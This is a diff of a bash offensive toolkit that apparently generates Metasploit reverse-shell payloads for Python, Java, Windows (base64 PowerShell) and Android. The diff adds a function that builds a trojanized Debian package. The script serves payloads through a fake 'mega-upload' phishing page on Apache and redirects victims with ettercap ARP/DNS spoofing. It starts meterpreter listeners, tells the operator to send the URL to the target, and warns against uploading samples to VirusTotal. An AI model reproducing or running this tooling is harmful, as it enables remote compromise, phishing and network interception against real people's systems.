@@ -3460,23 +3609,23 @@ sleep 2
 
    # check if exec.ps1 exists
    if [ -e $InJEc9 ]; then
-      echo "[☠ ] exec0.py -> found!"
+      echo "[☠] exec0.py -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] exec0.py -> not found!"
+      echo "[☠] exec0.py -> not found!"
       exit
       fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
@@ -3484,9 +3633,9 @@ sleep 2
 
 # injecting shellcode into name.py
 cd $IPATH/templates/
-echo "[☠ ] Injecting shellcode -> $N4m.py!"
+echo "[☠] Injecting shellcode -> $N4m.py!"
 sleep 2
-echo "[☠ ] Make it executable..."
+echo "[☠] Make it executable..."
 sleep 2
 sed "s|InJEc|$disp|g" exec0.py > obfuscated.raw
 mv obfuscated.raw $IPATH/output/$N4m.py
@@ -3500,9 +3649,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
       sleep 2
 
@@ -3516,7 +3665,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       mv copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -3527,9 +3676,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -3537,9 +3686,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
 
         fi
@@ -3548,7 +3697,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -3572,7 +3721,7 @@ cd $IPATH/
 # -------------------------------------------------------
 sh_shellcode18 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --title="☠ JAR NAME ☠" --text "example: shellcode" --entry --width 330) > /dev/null 2>&1
@@ -3584,7 +3733,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\n\nAvailable
 
 
 if [ "$serv" = "java/meterpreter/reverse_tcp (default)" ]; then
-echo "[☠ ] Building shellcode -> java format ..."
+echo "[☠] Building shellcode -> java format ..."
 # display final settings to user
 cat << !
 
@@ -3601,9 +3750,9 @@ cat << !
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f java > $IPATH/output/$N4m.jar"
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] building raw shellcode..."
+echo "[☠] building raw shellcode..."
 sleep 2
-echo "[☠ ] Injecting shellcode -> $N4m.jar!"
+echo "[☠] Injecting shellcode -> $N4m.jar!"
 sleep 2
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
@@ -3613,9 +3762,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-     echo "[☠ ] Start a multi-handler..."
-     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-     echo "[☯ ] Please dont test samples on virus total..."
+     echo "[☠] Start a multi-handler..."
+     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+     echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
 
    else
@@ -3628,7 +3777,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       # copy from output
       cd $IPATH/output
       cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
       echo "- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE"
@@ -3640,9 +3789,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -3650,9 +3799,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
 
 
@@ -3660,7 +3809,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    fi
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -3676,7 +3825,7 @@ cd $IPATH/
 # build base64 jar payload
 # ------------------------
 elif [ "$serv" = "windows/meterpreter/reverse_tcp (base64)" ]; then
-echo "[☠ ] Building shellcode -> psh-cmd format ..."
+echo "[☠] Building shellcode -> psh-cmd format ..."
 # display final settings to user
 cat << !
 
@@ -3696,16 +3845,16 @@ xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p windows/meterp
 # display shellcode
 echo ""
 str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 2
 echo $str0
 echo ""
 
 # EDITING/BACKUP FILES NEEDED
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $IPATH/templates/exec.jar $IPATH/templates/exec[bak].jar
 sleep 2
-echo "[☠ ] Injecting shellcode -> $N4m.jar!"
+echo "[☠] Injecting shellcode -> $N4m.jar!"
 sleep 2
 cd $IPATH/templates
 sed "s|InJ3C|$str0|" exec.jar > $N4m.jar
@@ -3719,9 +3868,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-     echo "[☠ ] Start a multi-handler..."
-     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-     echo "[☯ ] Please dont test samples on virus total..."
+     echo "[☠] Start a multi-handler..."
+     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+     echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
 
    else
@@ -3734,7 +3883,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       # copy from output
       cd $IPATH/output
       cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
       echo "- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE"
@@ -3746,9 +3895,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -3756,9 +3905,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
 
 
@@ -3766,7 +3915,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    fi
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 sleep 2
 rm $ApAcHe/$N4m.jar > /dev/null 2>&1
 rm $D3F/index.html > /dev/null 2>&1
@@ -3782,7 +3931,7 @@ cd $IPATH/
 
 else
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cancel button pressed, aborting..."
+echo "[☠] Cancel button pressed, aborting..."
 sleep 2
 fi
 }
@@ -3798,9 +3947,9 @@ fi
 # writen by: 'Andrew Smith' 'Ben Campbell' 'Chris Campbell'
 # this as nothing to do with shellcode, but i LOVE this :D
 # ---------------------------------------------------------
-sh_web_delivery () {
+sh_shellcode19 () {
 # get user input to build the payload
-echo "[☆ ] Enter shellcode settings!"
+echo "[☆] Enter shellcode settings!"
 srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
 # CHOSE WHAT PAYLOAD TO USE
@@ -3808,7 +3957,7 @@ PuLK=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Available pay
 
 
    if [ "$PuLK" = "python" ]; then
-   echo "[☠ ] Building shellcode -> $PuLK format ..."
+   echo "[☠] Building shellcode -> $PuLK format ..."
    sleep 2
    tagett="0"
    filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload" --entry --width 300) > /dev/null 2>&1
@@ -3830,25 +3979,25 @@ cat << !
 
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $IPATH/templates/web_delivery.py $IPATH/templates/web_delivery[bak].py
 
 
    # check if exec.ps1 exists
    if [ -e $IPATH/templates/web_delivery.py ]; then
-      echo "[☠ ] web_delivery.py -> found!"
+      echo "[☠] web_delivery.py -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] web_delivery.py -> not found!"
+      echo "[☠] web_delivery.py -> not found!"
       exit
    fi
 
 
 # edit/backup files nedded
 cd $IPATH/templates/
-echo "[☠ ] building -> $filename.py"
+echo "[☠] building -> $filename.py"
 sleep 2
 # use SED to replace SRVHOST in web_delivery.py
 sed "s/SRVHOST/$srvhost/g" web_delivery.py > $filename.py
@@ -3866,7 +4015,7 @@ sed "s|NaM3|$N4m|g" mega.html > copy.html
 mv copy.html $ApAcHe/index.html > /dev/null 2>&1
 cd $IPATH/output
 cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
-echo "[☠ ] loading -> Apache2Server!"
+echo "[☠] loading -> Apache2Server!"
 echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -3878,9 +4027,9 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
 
@@ -3889,16 +4038,16 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "- ATTACK VECTOR: http://$srvhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
 
         fi
 
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -3913,7 +4062,7 @@ cd $IPATH/
    else
 
 # -------------------------------------------------
-echo "[☠ ] Building shellcode -> $PuLK format ..."
+echo "[☠] Building shellcode -> $PuLK format ..."
 sleep 2
 tagett="2"
 filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload" --entry --width 300) > /dev/null 2>&1
@@ -3935,24 +4084,24 @@ cat << !
 
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $IPATH/templates/web_delivery.bat $IPATH/templates/web_delivery[bak].bat
 
 
    # check if exec.ps1 exists
    if [ -e $IPATH/templates/web_delivery.bat ]; then
-      echo "[☠ ] web_delivery.bat -> found!"
+      echo "[☠] web_delivery.bat -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] web_delivery.bat -> not found!"
+      echo "[☠] web_delivery.bat -> not found!"
       exit
       fi
 
 
 cd $IPATH/templates/
-echo "[☠ ] building -> $filename.bat"
+echo "[☠] building -> $filename.bat"
 sleep 2
 # use SED to replace SRVHOST in web_delivery.py
 sed "s/SRVHOST/$srvhost/g" web_delivery.bat > $filename.bat
@@ -3966,7 +4115,7 @@ sed "s|NaM3|$filename.bat|g" mega.html > copy.html
 mv copy.html $ApAcHe/index.html > /dev/null 2>&1
 cd $IPATH/output
 cp $filename.bat $ApAcHe/$filename.bat > /dev/null 2>&1
-echo "[☠ ] loading -> Apache2Server!"
+echo "[☠] loading -> Apache2Server!"
 echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -3978,9 +4127,9 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
 
@@ -3989,16 +4138,16 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "- ATTACK VECTOR: http://$srvhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
 
         fi
 
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -4015,20 +4164,153 @@ fi
 
 
 
+# ----------------------------------------
+# kimi - Malicious Debian Packet Creator
+# author: Chaitanya Haritash (SSA-RedTeam)
+# ----------------------------------------
+sh_shellcode20 () {
+# get user input to build the payload
+echo "[☠] Enter shellcode settings!"
+srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: theMinotaur" --width 300) > /dev/null 2>&1
+VeRp=$(zenity --entry --title "☠ DEBIAN PACKET VERSION ☠" --text "example: 1.0.13" --width 300) > /dev/null 2>&1
+
+
+# display final settings to user
+cat << !
+
+ shellcode settings
++-------------------------------
+| SRVPORT : 8080
+| SRVHOST : $srvhost
+| FORMAT  : SH,PYTHON -> unix(s)
+| PAYLOAD : python/meterpreter/reverse_tcp
+|_AGENT   : $IPATH/output/$N4m.deb
+
+!
+
+
+# EDITING/BACKUP FILES NEEDED
+echo ""
+echo "[☠] editing/backup files .."
+sleep 2
+
+
+   # check if kimi.py exists
+   if [ -e $IPATH/templates/kimi_MDPC/kimi.py ]; then
+      echo "[☠] MDPC-kimi.py -> found!"
+      sleep 2
+ 
+   else
+
+      echo "[☠] MDPC-kimi.py -> not found!"
+      exit
+   fi
+
+
+# use MDPC to build trojan agent
+echo "[☠] Use MDPC-kimi to build agent .."
+sleep 2
+cd $IPATH/templates/kimi_MDPC
+xterm -T "kimi.py (MDPC)" -geometry 110x23 -e "python kimi.py -n $N4m -V $VeRp -l $srvhost && sleep 2" > /dev/null 2>&1
+# move agent to the rigth directory (venom)
+echo "[☠] Moving agent to output folder .."
+sleep 2
+mv *.deb $IPATH/output/$N4m.deb > /dev/null 2>&1
+mv handler.rc $IPATH/output/handler.rc > /dev/null 2>&1
+cd $IPATH/
+
+
+# copy agent to apache2 and deliver it to target
+echo "[☠] Execute in target: sudo dpkg -i $N4m.deb"
+sleep 2
+
+
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.deb\n\nchose how to deliver: $N4m.deb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
+      sleep 2
+
+   else
+
+      # edit files nedded
+      echo "[☠] copy files to webroot..."
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.deb|g" mega.html > copy.html
+      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m.deb $ApAcHe/$N4m.deb > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "yes" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        cp $IPATH/output/$N4m.deb $D3F/$N4m.deb
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+
+        else
+
+        echo "- ATTACK VECTOR: http://$srvhost"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
+
+        fi
+   fi
+
+
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+sleep 2
+mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+rm $D3F/index.html > /dev/null 2>&1
+rm $D3F/$N4m.deb > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm $ApAcHe/$N4m.deb > /dev/null 2>&1
+clear
+cd $IPATH/
+# limpar /usr/local/bin in target on exit
+# rm /usr/local/bin/$N4m > /dev/null 2>&1
+}
+
+
+
+
 
 # -----------------------------
 # Android payload 
 # ----------------------------- 
-sh_dalvik () {
+sh_shellcode21 () {
 
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 
-echo "[☠ ] Building shellcode -> DALVIK format ..."
+echo "[☠] Building shellcode -> DALVIK format ..."
 # display final settings to user
 cat << !
 
@@ -4053,23 +4335,23 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
       sleep 2
 
    else
 
       # edit files nedded
-      echo "[☠ ] copy files to webroot..."
+      echo "[☠] copy files to webroot..."
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
       sed "s|NaM3|$N4m.apk|g" mega.html > copy.html
       mv copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.apk $ApAcHe/$N4m.apk > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
